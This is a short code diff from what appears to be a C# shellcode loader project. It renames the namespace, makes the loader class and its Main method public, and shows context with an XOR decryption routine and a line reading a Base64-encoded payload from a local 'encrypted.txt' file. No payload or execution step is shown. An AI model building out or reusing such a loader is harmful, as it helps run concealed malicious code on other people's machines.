@@ -8,9 +8,9 @@ using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading;
 
-namespace ShellcodeLoader
+namespace MainLoader
 {
-    class ShellcodeLoader
+    public class ShellcodeLoader
     {
         static byte[] XOR(byte[] inputBytes, byte[] keyBytes)
         {
@@ -27,7 +27,7 @@ namespace ShellcodeLoader
         }
 
 
-        static void Main(string[] args)
+        public static void Main()
         {
             // Base64 raw payload
             string base64String = File.ReadAllText("C:\\Users\\kyria\\Desktop\\github\\ShellcodeLoaderGPT\\ShellcodeLoaderGPT\\encrypted.txt");
